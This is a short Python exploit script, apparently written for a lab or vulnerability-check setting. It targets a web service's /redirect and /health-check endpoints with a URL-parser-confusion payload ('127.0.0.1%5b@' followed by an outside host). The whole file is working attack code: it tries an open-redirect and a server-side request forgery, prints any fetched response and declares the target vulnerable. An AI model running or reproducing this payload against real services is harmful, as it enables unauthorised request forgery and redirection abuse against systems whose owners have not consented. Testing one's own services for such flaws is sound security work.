import argparse
import requests
from colorama import Fore, Style, init

init(autoreset=True)

MALICIOUS_SITE = "www.baidu.com"


def open_redirect_attack(target_url):
    payload = f"http://127.0.0.1%5b@{MALICIOUS_SITE}/robots.txt"
    endpoint = f"{target_url}/redirect"
    try:
        print("[*] Attempting Open Redirect Attack...")
        response = requests.get(endpoint, params={"url": payload}, allow_redirects=False)

        if response.status_code == 302:  # HTTP 302 리다이렉트 발생
            print(f"{Fore.GREEN}[+] Redirected to: {response.headers.get('Location')}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}[-] Open Redirect Attack failed. Status code: {response.status_code}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return False


def ssrf_attack(target_url):
    payload = f"http://127.0.0.1%5b@{MALICIOUS_SITE}/robots.txt"
    endpoint = f"{target_url}/health-check"
    try:
        print("[*] Attempting SSRF Attack...")
        response = requests.get(endpoint, params={"url": payload})

        if response.status_code == 200 or "root" in response.text:
            print(f"{Fore.GREEN}[+] SSRF attack successful!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}--- BEGIN RESPONSE ---{Style.RESET_ALL}")
            print(response.text)
            print(f"{Fore.CYAN}--- END RESPONSE ---{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}[-] SSRF Attack failed. Status code: {response.status_code}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return False


if __name__ == "__main__":
    # 명령줄 인자 처리
    parser = argparse.ArgumentParser(description="Exploit script for Open Redirect and SSRF attacks.")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://localhost:8080)")
    args = parser.parse_args()

    # 입력된 URL
    target_url = args.url.rstrip('/')  # 슬래시 제거

    # 각 공격 실행
    redirect_result = open_redirect_attack(target_url)
    ssrf_result = ssrf_attack(target_url)

    # 최종 취약점 탐지 여부 출력
    if redirect_result or ssrf_result:
        print(f"\n{Fore.GREEN}Detected Vulnerability: True{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.RED}Detected Vulnerability: False{Style.RESET_ALL}")